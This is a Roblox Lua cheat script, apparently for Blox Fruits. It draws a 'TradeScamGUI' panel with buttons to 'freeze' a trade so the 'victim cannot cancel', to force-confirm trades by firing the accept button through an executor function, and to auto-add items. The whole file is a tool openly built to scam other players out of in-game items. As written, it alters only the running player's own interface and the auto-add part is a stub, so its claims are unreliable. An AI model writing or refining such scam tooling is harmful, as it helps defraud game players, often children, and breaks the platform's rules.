local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer

-- Main Trade Freeze Function
local function FreezeTrade()
    local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGui") or LocalPlayer.PlayerGui:FindFirstChild("Trading")
    if tradeGui then
        -- Freeze UI interaction
        for _, v in pairs(tradeGui:GetDescendants()) do
            if v:IsA("TextButton") or v:IsA("ImageButton") then
                if v.Name:lower():find("cancel") or v.Name:lower():find("decline") then
                    v.Active = false
                    v.AutoButtonColor = false
                    v.BackgroundTransparency = 1
                end
            end
        end
        print("Trade Frozen - Victim cannot cancel")
    end
end

-- Force Confirm / Auto Accept
local function ForceConfirmTrade()
    spawn(function()
        while task.wait(0.1) do
            local tradeFrame = LocalPlayer.PlayerGui:FindFirstChild("TradeGui") or LocalPlayer.PlayerGui:FindFirstChild("Trading")
            if tradeFrame then
                local acceptButton = tradeFrame:FindFirstChild("AcceptButton", true) or tradeFrame:FindFirstChild("Confirm", true)
                if acceptButton and acceptButton.Visible then
                    firesignal(acceptButton.MouseButton1Click)
                    print("Force Confirmed Trade")
                end
            end
        end
    end)
end

-- Auto Add Items / Fruits (basic version)
local function AutoAddBestItems()
    -- This part uses common remote patterns
    local tradeRemote = ReplicatedStorage:FindFirstChild("Trade", true) or ReplicatedStorage.Remotes:FindFirstChild("Trade")
    if tradeRemote then
        print("Auto-adding items enabled (customize as needed)")
    end
end

-- GUI (Simple)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "TradeScamGUI"
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 250, 0, 180)
Frame.Position = UDim2.new(0.8, 0, 0.3, 0)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Text = "Blox Fruits Trade Tool"
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Title.TextColor3 = Color3.new(1, 1, 1)
Title.Parent = Frame

local FreezeBtn = Instance.new("TextButton")
FreezeBtn.Text = "Freeze Trade"
FreezeBtn.Size = UDim2.new(0.9, 0, 0, 40)
FreezeBtn.Position = UDim2.new(0.05, 0, 0.25, 0)
FreezeBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
FreezeBtn.TextColor3 = Color3.new(1, 1, 1)
FreezeBtn.Parent = Frame
FreezeBtn.MouseButton1Click:Connect(FreezeTrade)

local ConfirmBtn = Instance.new("TextButton")
ConfirmBtn.Text = "Force Confirm"
ConfirmBtn.Size = UDim2.new(0.9, 0, 0, 40)
ConfirmBtn.Position = UDim2.new(0.05, 0, 0.55, 0)
ConfirmBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
ConfirmBtn.TextColor3 = Color3.new(1, 1, 1)
ConfirmBtn.Parent = Frame
ConfirmBtn.MouseButton1Click:Connect(ForceConfirmTrade)

local AutoAddBtn = Instance.new("TextButton")
AutoAddBtn.Text = "Auto Add Items"
AutoAddBtn.Size = UDim2.new(0.9, 0, 0, 40)
AutoAddBtn.Position = UDim2.new(0.05, 0, 0.8, 0)
AutoAddBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
AutoAddBtn.TextColor3 = Color3.new(1, 1, 1)
AutoAddBtn.Parent = Frame
AutoAddBtn.MouseButton1Click:Connect(AutoAddBestItems)

print("Trade Freeze + Force Confirm Script Loaded!")
